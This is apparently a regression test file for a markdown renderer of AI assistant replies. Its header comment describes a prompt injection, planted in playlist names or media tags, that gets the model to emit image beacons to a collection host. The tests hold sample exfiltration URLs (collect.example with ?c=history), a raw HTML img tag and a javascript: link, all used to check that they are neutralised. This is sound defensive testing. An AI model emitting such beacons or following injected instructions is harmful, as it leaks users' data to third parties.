/**
 * @vitest-environment jsdom
 *
 * Regression — model-authored markdown rendered live `<img>` beacons.
 *
 * `MarkdownContent` renders Rocksy's and Savant's replies. It hardened `a` but
 * left `img` at the rehype-sanitize default, so `![](https://collect.example/?c=…)`
 * — which a prompt injection in any playlist name or media tag can ask the
 * model to emit — was fetched by the viewer's browser the moment it rendered.
 */
import { describe, it, expect } from "vitest";
import { render } from "@testing-library/react";

import { MarkdownContent } from "../../renderer/components/common/MarkdownContent";

describe("MarkdownContent never renders an auto-fetching element", () => {
  it("renders a markdown image as inert alt text", () => {
    const { container } = render(
      <MarkdownContent
        content={
          "Here you go ![secret](https://collect.example/p?c=history) and " +
          "![](https://collect.example/q) done"
        }
      />
    );
    expect(container.querySelector("img")).toBeNull();
    expect(container.innerHTML).not.toContain("collect.example");
    expect(container.textContent).toContain("[image: secret]");
    expect(container.textContent).toContain("[image]");
  });

  it("does not render raw HTML images either", () => {
    const { container } = render(
      <MarkdownContent content={'<img src="https://collect.example/raw">'} />
    );
    expect(container.querySelector("img")).toBeNull();
  });

  it("control: links still render, and only for http(s)", () => {
    const { container } = render(
      <MarkdownContent content={"[docs](https://example.com/x) [bad](javascript:alert(1))"} />
    );
    const links = [...container.querySelectorAll("a")].map((a) => a.getAttribute("href"));
    expect(links).toEqual(["https://example.com/x", "#"]);
  });
});
